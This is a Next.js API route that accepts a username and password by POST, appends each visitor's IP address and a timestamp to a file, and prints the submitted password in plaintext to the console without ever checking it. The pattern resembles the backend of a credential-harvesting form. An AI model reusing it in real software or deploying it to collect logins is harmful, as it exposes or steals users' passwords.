// pages/api/submit.js

import fs from "fs";
import path from "path";

export default function handler(req, res) {
  if (req.method === "POST") {
    const { username, passwd } = req.body;

    // Log the IP address
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const logEntry = `${ip} - ${new Date().toISOString()}\n`;
    const filePath = path.join(process.cwd(), "ip2.txt");

    // Append the IP address to the file
    fs.appendFile(filePath, logEntry, (err) => {
      if (err) {
        console.error("Error writing to log file", err);
        res.status(500).json({ error: "Internal Server Error" });
        return;
      }

      // Here you can handle the submitted username and password
      console.log("Username:", username);
      console.log("Password:", passwd);

      // Respond with success
      res.status(200).json({ message: "Form submitted successfully" });
    });
  } else {
    // Handle any other HTTP method
    res.setHeader("Allow", ["POST"]);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
